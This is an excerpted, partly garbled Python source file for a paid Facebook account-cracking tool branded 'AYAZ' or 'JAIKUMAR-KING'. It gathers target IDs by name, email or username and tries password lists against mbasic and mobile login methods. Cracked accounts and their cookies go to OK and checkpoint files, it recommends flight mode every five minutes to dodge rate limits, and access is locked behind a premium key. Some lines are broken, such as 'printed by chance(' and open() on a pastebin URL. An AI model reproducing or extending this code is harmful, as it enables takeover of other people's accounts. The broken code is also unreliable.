...
def menu():
    ...
    psb('         %s》%s》%s》%sWELLCOME TO AYAZ TOOL%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
...
def dump_name(_azimvau_):
    print('%s [%s•%s] %sEXAMPLE : JAIKUMAR-KING,KANHA'%(H,P,H,K));__name__ = _cici_azimvau_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def dump_email():
    print("%s [%s•%s] %sEXAMPLE : JAIKUMAR-KINGkanha "%(H,P,H,K));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
...
def dump_username():
    print("%s [%s•%s] %sEXAMPLE : %sJAIKUMAR-KING KANHA"%(H,P,H,K,H));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
        ...
        try:
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    files_cp = "JAIKUMAR-KING-CP/%s.txt"%(tanggal)
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sJAIKUMAR-KING-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    files_ok = "JAIKUMAR-KING-OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                    else:
                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sJAIKUMAR-KING-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                        else:print("\r %s[%sJAIKUMAR-KING-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
...
def result():
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            okl = os.listdir("JAIKUMAR-KING-OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            ...
            try:
                ppp = _azimvau_dapunta_("JAIKUMAR-KING-OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sJAIKUMAR-KING-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("JAIKUMAR-KING-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("JAIKUMAR-KING-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sJAIKUMAR-KING-CP%s] %s'%(K,P,K,yyy))
...
def cek_result():
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%sJAIKUMAR-KING-CP%s] %s          "%(K,P,K,kontol)
...
def started():
    ...
    print('%s [%s•%s] %s[%sOK%s] IDS SAVED IN >> %sJAIKUMAR-KING-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sJAIKUMAR-KING-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [5 SEC] EVERY 5 MINUTES\n'%(H,P,H,B))


def folder():
    try:os.mkdir("JAIKUMAR-KING-CP")
    except:pass
    try:os.mkdir("JAIKUMAR-KING-OK")
    except:pass
...
def genkey():
	try:
		...
		banner()
		psb('       %s》%s》%s》%sPOWER OF JAIKUMAR-KING%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;91m              YOU ARE NOT PREMIUM USER ")
		print("\033[0;91m           FIRST BUY PREMIUM KEY FROM OWNER")
		print("\033[0;91m.          PAYMENT CANT BE UNDONE")
		print("\033[0;91m.          CHANGE USER AGENT IF CP IDS CAME")
		print("\033[0;93m               SEND THIS KEY TO OWNER \n\n YOUR KEY : \033[0;92m%s%s"%(rb,basesplit))
		printed by chance("\033[0;93m    TOOL PRICE : %sRs150"%(H))
...
def keycheck():
    try:
        k = open("https://pastebin.com/raw/2ceqHj0i","r").txt
